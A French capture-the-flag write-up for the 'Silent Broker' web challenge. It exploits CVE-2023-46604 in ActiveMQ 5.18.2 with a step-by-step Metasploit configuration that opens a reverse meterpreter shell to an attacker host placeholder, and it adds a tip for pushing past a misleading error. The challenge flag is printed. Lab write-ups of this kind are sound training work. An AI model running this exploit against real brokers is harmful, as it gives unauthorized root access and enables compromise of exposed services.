---
title: "Silent Broker · CVE-2023-46604 ActiveMQ"
platform: "HackerLab Benin 2026"
category: "web"
difficulty: "—"
points: 0
os: "—"
date: 2026-11-20
author: "DazBot13-boopt, elielfresnel"
author_github: "DazBot13-boopt"
source: "https://github.com/DazBot13-boopt/hackerlab-benin-2026-wu/blob/main/web/broker.md"
tags: [hackerlab-benin-2026, web]
status: published
---

# Silent Broker : Web · CVE-2023-46604 ActiveMQ RCE

**Catégorie** : web  
**Flag** : `HLB2026{INTERNAL_SERVICE_RCE_CASE_RELAY_COMPROMISED}`

## TL;DR

ActiveMQ 5.18.2 exposé sur le port OpenWire. CVE-2023-46604 permet une désérialisation non authentifiée qui charge un XML Spring distant et exécute du code arbitraire en root.

## Reconnaissance

Un scan complet des ports révèle la surface du service :

```
1883/tcp  MQTT
5672/tcp  AMQP
61613/tcp STOMP
61614/tcp STOMP+SSL
61616/tcp OpenWire
```

Les protocoles STOMP et MQTT sont accessibles anonymement et confirment la version via le bannière : **ActiveMQ 5.18.2**. Les files visibles (`auth`, `session`, `credentials`) indiquent le rôle du broker dans l'infrastructure.

## Exploitation

CVE-2023-46604 exploite le protocole OpenWire pour forcer le broker à charger un `ClassPathXmlApplicationContext` depuis une URL contrôlée. L'URL pointe vers un XML Spring qui instancie un bean exécutant une commande système.

```
use exploit/multi/misc/apache_activemq_rce_cve_2023_46604
set RHOSTS 172.28.14.3
set RPORT 61616
set TARGET 1
set PAYLOAD cmd/linux/http/x64/meterpreter/reverse_tcp
set LHOST <ATT_IP>
set SRVPORT 8899
set ForceExploit true
run
```

Le module retourne une erreur `Response length mismatch` (bannière annonce 338 octets, en livre 337) mais la session s'ouvre quand même. Ne pas interpréter cette erreur comme un échec.

La session meterpreter s'ouvre en `root`. Le flag est dans `/opt/activemq/data/flag.txt` :

```
HLB2026{INTERNAL_SERVICE_RCE_CASE_RELAY_COMPROMISED}
```

## À retenir

ActiveMQ 5.18.2 est vulnérable à CVE-2023-46604 même quand le check Metasploit se plaint d'un mismatch de longueur. Toujours vérifier si une session a réellement été ouverte avant de conclure à l'échec.
